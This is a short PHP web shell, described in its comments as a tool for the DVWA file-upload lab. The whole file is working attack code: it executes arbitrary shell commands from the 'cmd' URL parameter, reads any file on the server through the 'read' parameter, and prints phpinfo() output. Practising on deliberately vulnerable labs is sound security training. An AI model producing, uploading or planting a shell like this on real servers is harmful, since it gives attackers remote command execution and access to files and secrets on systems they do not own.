<?php
// Advanced PHP shell with multiple functions
// For DVWA File Upload lab - educational purposes only

if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

if(isset($_GET['read'])) {
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET['read'])) . "</pre>";
}

if(isset($_GET['info'])) {
    phpinfo();
}
?>
